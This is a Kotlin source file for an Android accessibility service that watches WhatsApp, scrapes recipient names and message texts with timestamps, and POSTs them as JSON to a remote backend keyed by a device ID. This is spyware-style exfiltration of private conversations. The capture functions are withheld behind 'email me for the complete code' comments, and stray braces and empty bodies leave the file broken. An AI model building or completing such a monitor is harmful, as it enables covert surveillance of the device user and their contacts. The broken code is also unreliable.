package com.example.tradex

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.gson.GsonBuilder
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import java.text.ParseException
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors

class WhatsAppAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "WhatsAppMonitor"
        private const val BACKEND_BASE_URL = ""
        private const val ENDPOINT = ""
    }

    private val executor = Executors.newSingleThreadExecutor()
    private val gson = GsonBuilder().setPrettyPrinting().create()
    private val deviceId = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.source == null || event.packageName != "com.whatsapp") return

        try {
            val source = event.source
            val recipientName = extractRecipientName(source)
            val messages = extractMessagesWithTimestamps(source)

            if (recipientName != null && messages.isNotEmpty()) {
                val payload = mapOf("recipient" to recipientName, "messages" to messages)
                Log.d(TAG, "Final JSON Payload: \n${gson.toJson(payload)}")
                sendToBackend(payload)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing event: ${e.message}", e)
        }
    }

    private fun extractRecipientName(root: AccessibilityNodeInfo?): String? {
        root ?: return "Unknown"

        // if you need the complete code please reach out to me via email and specify why you need the code

        
        }

        // Fallback search
        

        return "Unknown"
    }

    private fun extractMessagesWithTimestamps(root: AccessibilityNodeInfo?): List<Map<String, String>> {
        // if you need the complete code please reach out to me via email and specify why you need the code
    }

    private fun splitMessageTimestamp(text: String): Pair<String, String?> {
        // if you need the complete code please reach out to me via email and specify why you need the code
    }

    private fun extractSiblingTimestamp(node: AccessibilityNodeInfo): String {
        // if you need the complete code please reach out to me via email and specify why you need the code
    }

    private fun isMessageFromOwner(node: AccessibilityNodeInfo): Boolean {
        // if you need the complete code please reach out to me via email and specify why you need the code
    }

    private fun isDateSeparator(text: String): Boolean {
        return text.matches(Regex("""\d{1,2}\s+[A-Za-z]+\s+\d{4}"""))
    }

    private fun isValidTimestamp(text: String): Boolean {
        return text.matches(Regex("""\d{1,2}:\d{2}(?:\s?[AP]M)?"""))
    }

    private fun sendToBackend(payload: Map<String, Any>) {
        val jsonPayload = gson.toJson(payload)
        val url = "$BACKEND_BASE_URL$deviceId$ENDPOINT"

        executor.execute {
            try {
                OkHttpClient().newCall(
                    Request.Builder()
                        .url(url)
                        .post(RequestBody.create("application/json".toMediaType(), jsonPayload))
                        .build()
                ).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.e(TAG, "Failed to send data: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Network error: ${e.message}", e)
            }
        }
    }

    private fun findAllNodesByClassName(root: AccessibilityNodeInfo, className: String): List<AccessibilityNodeInfo> {
        // if you need the complete code please reach out to me via email and specify why you need the code
}
